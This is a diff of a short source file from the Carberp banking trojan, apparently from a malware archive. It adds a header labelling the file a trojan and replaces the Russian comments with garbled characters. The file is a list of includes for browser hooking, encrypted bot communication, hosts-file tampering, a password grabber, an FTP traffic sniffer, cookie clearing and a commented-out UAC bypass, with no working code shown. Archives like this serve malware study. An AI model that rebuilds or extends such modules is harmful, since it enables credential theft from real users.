@@ -1,12 +1,23 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 /*--------------------------------------------------------------------------*/
 //
-//  Модули сборки LITE.
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ LITE.
 //
 /*--------------------------------------------------------------------------*/
 
 
-#include "InternetExplorer.h" // Обработка запросов InternetExplorer
+#include "InternetExplorer.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetExplorer
 #include "Firefox.h"
 #include "Opera.h"
 
@@ -14,13 +25,13 @@
 
 #include "KeepAlive.h"
 
-#include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
+#include "BotCryptHTTP.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-#include "BotHosts.h" // Включаем использование файла ностов
+#include "BotHosts.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 
-#include "Grabber.h" // Включение грабера паролей
-#include "FtpSniffer.h" // Перехват фтп трафика
-#include "coocksol.h" // Очистка куков ИЕ и ФФ
+#include "Grabber.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#include "FtpSniffer.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#include "coocksol.h" // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅ
 
 //#include "Exploit\\UAC_bypass.h"
